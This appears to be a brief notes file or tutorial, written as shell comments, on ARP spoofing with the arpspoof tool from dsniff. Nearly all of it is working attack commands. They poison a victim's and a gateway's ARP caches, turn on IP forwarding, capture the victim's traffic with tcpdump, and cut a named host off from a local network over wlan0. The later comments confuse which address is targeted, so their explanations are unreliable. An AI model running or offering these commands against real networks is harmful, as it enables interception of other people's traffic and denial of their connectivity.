#In order to tell the victim host that now we (our MAC address) are the one belonging to the IP of the gateway enter the following command:
# arpspoof -t victim gateway

#In a seperate shell we start the matching command to fool gateway to belive we are victim.
# arpspoof -t gateway victim

#Don't forget to enable IP forwarding on your host so that the traffic goes through your host. Otherwise victim will loose connectivity.
# echo 1 > /proc/sys/net/ipv4/ip_forward

#Now watch all the traffic between the victim host and the outside network going through your machine
# tcpdump host victim and not arp

#The tool used here is called arpspoof and is distributed in the dsniff package.
#The code above will make PC with IP address 192.168.1.1 disconnected with 192.168.1.2 which mean 192.168.1.1 won’t be able to send ping to 192.168.1.2 and vice versa. ‘wlan0′ means that the arp poisoning will be done through interface wlan0, you can see your available interface use command

sudo arpspoof -i wlan0 -t 192.168.1.2 192.168.1.1

#The code above will make the targeted PC (192.168.1.1) disconnected from all PC in the network.

sudo arpspoof -i wlan0 192.168.1.1
